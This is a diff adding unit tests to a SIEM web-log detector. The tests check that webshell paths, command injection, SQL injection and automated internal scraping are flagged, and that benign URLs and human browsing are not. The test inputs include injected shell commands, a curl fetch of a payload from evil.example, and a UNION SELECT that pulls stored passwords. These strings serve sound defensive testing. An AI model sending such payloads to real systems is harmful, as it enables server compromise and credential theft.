@@ -193,5 +193,82 @@ class TestSIEMAccuracyCorpus(unittest.TestCase):
         self.assertEqual(res[1], "low")
         self.assertEqual(res[0], "SCANNER_RECON")
 
+    # =========================================================================
+    # 5. WEBSHELLS, COMMAND INJECTION, STATIC-PATH PAYLOADS & INTERNAL SCRAPERS
+    # =========================================================================
+    def test_webshell_cmd_injection_and_jsessionid_safety(self):
+        malicious_paths = [
+            "/uploads/shell.jsp",
+            "/cmd.jsp?c=whoami",
+            "/admin/c99.php",
+            "/search?q=test;whoami",
+            "/run?cmd=$(/bin/sh -c id)",
+            "/diag?p=|id -u",
+            "/fetch?u=;curl https://evil.example/payload.sh",
+        ]
+        for p in malicious_paths:
+            ev_type, sev, title, _, _ = evaluate_web_security_event(
+                "GET", p, 200, "-", "203.0.113.55", bytes_sent=512
+            )
+            self.assertEqual(ev_type, "RCE_WEBSHELL_EXEC", f"Missed webshell/cmd injection on {p}: got {ev_type}")
+            self.assertEqual(sev, "high", f"Expected high severity for {p}, got {sev} ({title})")
+
+        benign_paths = [
+            "/login;jsessionid=9F8E7D6C5B4A",
+            "/item;id=5",
+            "/root_dashboard.jsp",
+            "/about.jsp",
+            "/alfa/status",
+        ]
+        for p in benign_paths:
+            ev_type, sev, title, _, _ = evaluate_web_security_event(
+                "GET", p, 200, "operator", "192.168.150.10", bytes_sent=512
+            )
+            self.assertEqual(sev, "info", f"Benign URL {p} triggered false alert {ev_type} ({title})")
+
+    def test_static_ext_query_sqli_internal_scraper_and_ssti_cleanup_scope(self):
+        import os
+        from app import check_mass_scraping_detection, _scraping_tracker
+
+        _scraping_tracker.clear()
+
+        # 1. Payload smuggled via query string on a .css/.js path evaluates non-info (never silently dropped)
+        ev_type, sev, _, _, _ = evaluate_web_security_event(
+            "GET", "/static/app.css?id=1' UNION SELECT username, password FROM users--",
+            200, "-", "203.0.113.80", bytes_sent=25000
+        )
+        self.assertEqual(ev_type, "SQL_INJECTION")
+        self.assertEqual(sev, "critical")
+
+        # 2. Internal automated scraper tool on LAN triggers DATA_HARVESTING; normal browser traffic does not
+        triggered = False
+        for i in range(16):
+            is_scrap, _ = check_mass_scraping_detection(
+                "192.168.150.99", "-", f"/consumer/view?kno=100{i}",
+                method="GET", raw_line='192.168.150.99 - - "GET /consumer/view?kno=1001 HTTP/1.1" 200 100 "python-requests/2.31.0"'
+            )
+            if is_scrap:
+                triggered = True
+                break
+        self.assertTrue(triggered, "Automated scraper UA on internal 192.168.x LAN must still trigger")
+
+        human_triggered = False
+        for i in range(25):
+            is_scrap, _ = check_mass_scraping_detection(
+                "192.168.150.10", "clerk1", f"/consumer/view?kno=200{i}",
+                method="GET", raw_line='192.168.150.10 - - "GET /consumer/view?kno=2001 HTTP/1.1" 200 100 "Mozilla/5.0 Chrome/120.0"'
+            )
+            if is_scrap:
+                human_triggered = True
+                break
+        self.assertFalse(human_triggered, "Human browser traffic from internal LAN/proxy must stay noise-free")
+
+        # 3. Code contract guards: static ext skip only skips sev=='info' & startup SSTI cleanup preserves real SSTI incidents
+        app_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "app.py")
+        with open(app_path, "r", encoding="utf-8") as f:
+            app_src = f.read()
+        self.assertIn("if STATIC_EXT_RE.search(clean_path) and sev == \"info\":", app_src)
+        self.assertIn("SELECT 1 FROM app_incident_events e WHERE e.incident_id = app_incidents.id", app_src)
+
 if __name__ == '__main__':
     unittest.main()
